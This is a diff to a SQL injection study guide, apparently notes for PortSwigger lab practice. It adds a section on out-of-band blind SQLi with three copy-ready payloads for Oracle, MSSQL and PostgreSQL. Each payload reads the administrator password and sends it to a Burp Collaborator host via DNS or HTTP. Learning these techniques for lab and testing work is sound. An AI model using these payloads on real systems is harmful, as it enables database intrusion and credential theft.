@@ -2493,11 +2493,11 @@ Partimos de:
 [Blind SQLi](#blind-sqli)  
 [Blind SQLi no indication](#blind-sqli-no-indication)  
 [Blind SQLi Conditional Response](#blind-sqli-conditional-response)  
+[Blind SQLi OutOfBand data exfiltration](#Blind-SQLi-OutOfBand-data-exfiltration)  
 [Oracle](#oracle)  
 [SQLMAP](#sqlmap)  
 [Non-Oracle Manual SQLi](#non-oracle-manual-sqli)  
 [Visual error-based SQLi](#visual-error-based-sqli)  
-[HackTheBox CPTS SQLi Fundamentals](https://github.com/botesjuan/cpts-quick-references/blob/main/module/SQL%20Injection%20Fundamentals.md)  
 [Conclusiones útiles](#conclusiones-útiles)  
   
 >Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
@@ -2633,6 +2633,27 @@ TrackingId=' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admi
 ![CLUSTER bomb](images/cluster-bomb.png)  
 
 [PortSwigger Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)  
+
+### Blind SQLi OutOfBand data exfiltration
+
+```
+(Oracle)
+
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+
+```
+(Microsoft SQL Server)
+
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+
+```
+(PostgreSQL)
+
+TrackingId=x'||(SELECT http_get('http://' || (SELECT password FROM users WHERE username='Administrator') || '.BURP-COLLABORATOR-SUBDOMAIN'))||'--
+```
   
 ### Oracle  
 
